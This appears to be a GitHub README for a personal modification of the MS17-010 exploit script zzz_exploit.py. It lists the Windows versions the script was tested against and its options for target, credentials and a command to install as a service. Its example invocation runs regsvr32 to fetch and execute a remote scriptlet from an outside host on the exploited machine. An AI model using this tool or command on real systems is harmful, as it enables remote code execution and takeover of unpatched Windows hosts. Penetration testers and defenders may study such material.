# MS17-010 zzz_exploit.py modifications
All credit goes to Worawit: https://github.com/worawit/MS17-010/

This is my personal enhancement to zzz_exploit.py. Added functionality to dynamically pass users, passwords and commands to execute within a service.

This is also heavily inspired by Korey McKinley: https://lmgsecurity.com/manually-exploiting-ms17-010/

Full credit goes to Worawit/Sleepya and Korey McKinley!

## Help page output:
```
➜  MS17-010 git:(master) ✗ ./zzz_exploit.py --help                                                                                        
usage: zzz_exploit.py [-h] [-u] [-p] -t  [-c] [-P] [--version]

Tested versions:
1	Windows 2016 x64
2	Windows 10 Pro Vuild 10240 x64
3	Windows 2012 R2 x64
4	Windows 8.1 x64
5	Windows 2008 R2 SP1 x64
6	Windows 7 SP1 x64
7	Windows 2008 SP1 x64
8	Windows 2003 R2 SP2 x64
9	Windows XP SP2 x64
10	Windows 8.1 x86
11	Windows 7 SP1 x86
12	Windows 2008 SP1 x86
13	Windows 2003 SP2 x86
14	Windows XP SP3 x86
15	Windows 2000 SP4 x86

optional arguments:
  -h, --help        show this help message and exit
  -u , --user       Username to authenticate with
  -p , --password   Password for specified user
  -t , --target     Target for exploitation
  -c , --command    Command to add to service
  -P , --pipe       Pipe to connect to
  --version         show program's version number and exit
Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
```
